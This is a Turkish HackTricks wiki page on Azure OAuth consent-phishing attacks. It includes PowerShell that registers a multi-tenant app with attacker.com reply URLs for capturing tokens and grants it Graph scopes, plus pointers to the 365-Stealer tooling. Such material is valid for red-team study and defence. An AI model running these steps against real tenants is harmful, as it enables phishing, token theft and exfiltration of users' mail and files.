# Az - İzin Verme Hakkı

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)** bizi takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

## OAuth Uygulama Phishing

**Azure Uygulamaları**, **kullanıcı verilerine** (temel bilgiler, belgeler, e-posta gönderme vb.) erişim izni ister.\
Eğer **izin verilirse**, normal bir kullanıcı yalnızca **"Düşük Etkili" izinler** için onay verebilir. **Diğer tüm** durumlarda, **yönetici onayı gereklidir**.\
`GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` ve `uygulamalara izin verme yetkisi` içeren özel bir rol, kiracı genelinde onay verebilir.

Sadece **yönetici onayı gerektirmeyen** izinler **düşük etki** olarak sınıflandırılır. Bunlar, **temel oturum açma için gerekli olan** openid, profil, e-posta, User.Read ve offline\_access izinleridir. Eğer bir **kuruluş**, kullanıcı onayını **tüm uygulamalar için** izin verirse, bir çalışan bir uygulamaya **profilinden yukarıdakileri okuma** izni verebilir.

<figure><img src="../../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

Bu nedenle, bir saldırgan **kötü niyetli bir Uygulama** hazırlayabilir ve bir **phishing** ile kullanıcının **Uygulamayı kabul etmesini sağlayarak verilerini çalabilir**.

### 2 Tür İzin Verme Hakkı Saldırıları

* **Kimlik Doğrulaması Olmayan**: Dış bir hesaptan `User.Read` ve `User.ReadBasic.All` izinleri ile bir uygulama oluşturun, bir kullanıcıyı phishing yapın ve dizin bilgilerine erişim sağlayın.
* Bu, phishing yapılan kullanıcının dış ortamlardan OAuth uygulamalarını kabul edebilmesini gerektirir!
* **Kimlik Doğrulamalı**: Yeterli ayrıcalıklara sahip bir anahtarı ele geçirdikten sonra, hesap içinde bir uygulama oluşturun ve ayrıcalıklı OAuth izinlerini kabul edebilecek bazı ayrıcalıklı kullanıcıları phishing yapın.
* Bu durumda, dizin bilgilerine zaten erişiminiz var, bu nedenle `User.ReadBasic.All` izni artık ilginç değildir.
* **Yönetici onayı gerektiren izinlerle** ilgileniyor olabilirsiniz, çünkü sıradan bir kullanıcı OAuth uygulamalarına herhangi bir izin veremez, bu yüzden yalnızca **bu kullanıcıları phishing yapmanız gerekir** (bu ayrıcalığı veren roller/izinler hakkında daha fazla bilgi daha sonra).

### Kullanıcıların onay vermeye izin verip vermediğini kontrol etme

Aşağıdaki PowerShell komutu, Azure Active Directory (Azure AD) içindeki kullanıcıların uygulamalara onay verme yetenekleriyle ilgili onay yapılandırmasını kontrol etmek için kullanılır:
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
* **Kullanıcı onayını devre dışı bırak**: Bu ayar, kullanıcıların uygulamalara izin vermesini yasaklar. Uygulamalara kullanıcı onayı verilmesine izin verilmez.
* **Kullanıcılar, yalnızca seçtiğiniz izinler için doğrulanmış yayıncılardan veya kendi organizasyonunuzdan uygulamalara onay verebilir**: Bu ayar, tüm kullanıcıların yalnızca doğrulanmış bir yayıncı tarafından yayımlanan ve kendi kiracınızda kayıtlı uygulamalara onay vermesine izin verir. Belirli izinler için yalnızca onay vermeye izin vererek bir kontrol katmanı ekler.
* **Kullanıcılar tüm uygulamalara onay verebilir**: Bu ayar daha izin vericidir ve tüm kullanıcıların, bu izinlerin yönetim onayı gerektirmediği sürece, uygulamalar için herhangi bir izne onay vermesine izin verir.
* **Özel uygulama onay politikası**: Bu ayar, belirli organizasyonel gereksinimlere göre özelleştirilebilen ve uygulama yayıncısına, uygulamanın talep ettiği izinlere ve diğer faktörlere dayanan bir dizi kısıtlama içerebilecek özel bir politikanın mevcut olduğunu gösterir.

## **Yasa Dışı Onay Verme Saldırısını Anlamak**

Yasa dışı onay verme saldırısında, saldırganlar son kullanıcıları Azure'da kayıtlı kötü niyetli bir uygulamaya izin vermeye kandırır. Bu, uygulamanın meşru görünmesini sağlayarak, kurbanların "Kabul Et" butonuna bilmeden tıklamasına yol açar. Sonuç olarak, Azure AD, saldırganın sitesine bir token verir ve bu da onlara kurbanın verilerine erişim ve manipülasyon yapma imkanı tanır; örneğin, e-postaları okuma veya gönderme ve dosyalara erişme gibi, organizasyonel bir hesaba ihtiyaç duymadan.

## **Saldırı Akışının Genel Görünümü**

Saldırı, genel bir şirketi hedef alan birkaç adım içerir. İşte nasıl gelişebileceği:

1. **Alan Adı Kaydı ve Uygulama Barındırma**: Saldırgan, güvenilir bir siteye benzeyen bir alan adı kaydeder, örneğin "safedomainlogin.com". Bu alan adı altında, yetkilendirme kodlarını yakalamak ve erişim tokenları talep etmek için tasarlanmış bir uygulamayı barındırmak üzere bir alt alan adı oluşturulur (örneğin, "companyname.safedomainlogin.com").
2. **Azure AD'de Uygulama Kaydı**: Saldırgan, hedef şirketin adını kullanarak meşru görünmesi için Azure AD Kiracısında Çoklu Kiracı Uygulaması kaydeder. Uygulamanın Yönlendirme URL'sini kötü niyetli uygulamayı barındıran alt alan adına yönlendirecek şekilde yapılandırır.
3. **İzinlerin Ayarlanması**: Saldırgan, uygulamayı çeşitli API izinleriyle (örneğin, `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read`) ayarlar. Bu izinler, kullanıcı tarafından verildiğinde, saldırgana kullanıcının adına hassas bilgileri çıkarmasına olanak tanır.
4. **Kötü Niyetli Bağlantıların Dağıtılması**: Saldırgan, kötü niyetli uygulamanın istemci kimliğini içeren bir bağlantı hazırlar ve bunu hedeflenen kullanıcılara paylaşarak onları onay vermeye kandırır.

## **Saldırı İçin Araçların Kullanımı**

Saldırı, [**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer) gibi araçlar kullanılarak kolaylaştırılabilir.

### Saldırı Öncesi Hazırlık:

Eğer saldırgan, kurban organizasyondaki bir kullanıcıya belirli bir erişim seviyesine sahipse, organizasyonun politikasının kullanıcının uygulamaları kabul etmesine izin verip vermediğini kontrol edebilir:
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Password!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("generic@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# Check if "ManagePermissionGrantsForSelf.microsoft-user-default-legacy" is present, indicating permission to accept apps.
```
Saldırıyı gerçekleştirmek için, saldırganın **Azure Kiracısında yeni bir Uygulama oluşturması** gerekecek (Uygulama kayıtlarında), izinlerle yapılandırılmış:

<figure><img src="../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All`, `Delegated permissions` altında `Microsoft Graph` içindedir. (Uygulama izinleri her zaman ek onay gerektirecektir).

* `User.ReadBasic.All`, eğer verilirse, **kurumdaki tüm kullanıcıların bilgilerini okumanıza** izin verecek izindir.
* Sadece `GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` ve `izinleri uygulamalara verme izni` içeren özel bir rol, kiracı genelinde onay verebilir. Bu nedenle, **yönetici onayı gerektiren bir Uygulamayı onaylatmak istiyorsanız, bu rollerden biriyle bir kullanıcıyı oltalamalısınız**.

Ayrıca, cli aracılığıyla bir Uygulama oluşturabilirsiniz: 

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
$AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)

$app.RequiredResourceAccess.Add($AADAccess)
} else {
$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
{% endcode %}

[https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer) adresini kontrol edin ve nasıl yapılandırılacağını öğrenin.

{% hint style="warning" %}
Elde edilen **erişim jetonu** **graph endpoint** için `User.Read` ve `User.ReadBasic.All` (istenen izinler) kapsamları ile olacaktır. Diğer eylemleri gerçekleştiremeyeceksiniz (ancak bunlar org'daki **tüm kullanıcılar hakkında bilgi indirmek için yeterlidir**).
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

Bu aracı bu saldırıyı gerçekleştirmek için de kullanabilirsiniz.

## Post-Exploitation

Kullanıcıya erişim sağladıktan sonra, hassas belgeleri çalmak ve hatta arka kapılı belge dosyaları yüklemek gibi şeyler yapabilirsiniz.

## References

* [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/)

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.**

</details>
{% endhint %}
